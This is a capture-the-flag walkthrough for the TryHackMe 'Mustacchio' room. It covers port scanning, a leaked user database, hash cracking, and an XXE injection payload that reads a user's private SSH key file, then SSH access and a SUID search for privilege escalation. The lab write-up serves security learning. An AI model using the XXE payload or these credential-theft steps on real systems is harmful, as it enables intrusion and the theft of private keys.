📚 [TryHackMe Mustacchio](https://tryhackme.com/room/mustacchio)


## setup

1. [Install nmap](https://github.com/TurboLabIt/cybersec/blob/main/notes/nmap.md)


## recon

[nmap scan (zznmap)](https://github.com/TurboLabIt/cybersec/blob/main/notes/nmap.md)

> Discovered open port 22/tcp on <target>  
> Discovered open port 80/tcp on <target>  
> Discovered open port 8765/tcp on <target>

SSH, public-facing website (`http://<target>`), admin website (`http://<target>:8765`).


## hunting on the public-facing website

Public-facing website references:

````html
<link rel="stylesheet" type="text/css" href="custom/css/style.css">
````

`http://<target>/custom` is listable ➡ `http://<target>/custom/js/users.bak`

Alternative:

````shell
gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt
````


## open

````shell
file users.bak 
````

> users.bak: SQLite 3.x database, last written using SQLite version 3034001

Open with [DB Browser for SQLite](https://sqlitebrowser.org/).

Found user credentials. Hashed password ➡ [notes/hashcat-hash.md](https://github.com/TurboLabIt/cybersec/blob/main/notes/hashcat-hash.md)


## hunting on the admin website

Cracked auth allows access to the admin website.

It contains one form with one textarea with a comment:

> Barry, you can now SSH in using your key

The form has a custom validation function:

````html
<input type="submit" id="sub" onclick="checktarea()" value="Submit">
...
<script type="text/javascript">
    //document.cookie = "Example=/auth/dontforget.bak"; 
    function checktarea() {
        let tbox = document.getElementById("box").value;
        if (tbox == null || tbox.length == 0) {
            alert("Insert XML Code!")
        }
    }
</script>
````

The backend expects XML, then.


## exploit with XXE injection

`http://<target>:8765/auth/dontforget.bak` contains the expected XML document ➡ [notes/xml-xxe.md](https://github.com/TurboLabIt/cybersec/blob/main/notes/xml-xxe.md)

Display "barry" SSH key:

````xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<comment>
    <name>Joe Hamd</name>
    <author>Barry Clad</author>
    <com>&xxe;</com>
</comment>
````


## decrypt the key

Barry's SSH key is password-protected ➡ [notes/john-the-ripper-ssh-key-password.md](https://github.com/TurboLabIt/cybersec/blob/main/notes/john-the-ripper-ssh-key-password.md)


## ssh access

````shell
ssh berry@<target> -i decripted-berry-ssh-key
````

Barry's home contains the flag.


## escalation

SUID files:

````shell
find / -type f -perm -u=s  2>/dev/null | grep -iv '/usr/bin/\|/usr/lib/'
````

This one is promising:

> /home/joe/live_log
> -rwsr-xr-x 1 root root 16832 Jun 12  2021 /home/joe/live_log

It's root-owned, with a SUID ➡ it runs as root ➡ [notes/suid-exploit.md](https://github.com/TurboLabIt/cybersec/blob/main/notes/suid-exploit.md)
